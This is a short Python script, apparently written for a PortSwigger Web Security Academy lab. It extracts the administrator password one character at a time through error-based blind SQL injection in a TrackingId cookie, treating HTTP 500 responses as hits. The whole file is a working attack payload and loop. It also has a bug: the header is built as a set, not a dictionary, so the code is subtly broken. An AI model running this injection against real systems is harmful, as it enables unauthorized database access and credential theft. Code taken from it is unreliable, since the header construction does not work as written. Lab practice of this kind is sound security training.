import requests

# Create wordlists to iterate through
list_a = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
list_b = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

# URL, headers, and cookie
url = 'http://0a0100b50380728b80418f4c00cf007b.web-security-academy.net'

# Loopy
for item_a in list_a:
    for item_b in list_b:
        # Convert items to strings
        str_item_a = str(item_a)
        str_item_b = str(item_b)

        # Construct the cookie
        my_header = {"Cookie: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,"+str_item_a+",1)='"+str_item_b+"' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||''"}

        # Make the GET request
        response = requests.get(url, headers=my_header)

        # Check if the request was 500 (status code 500)
        if response.status_code == 500:
            print(str_item_b)
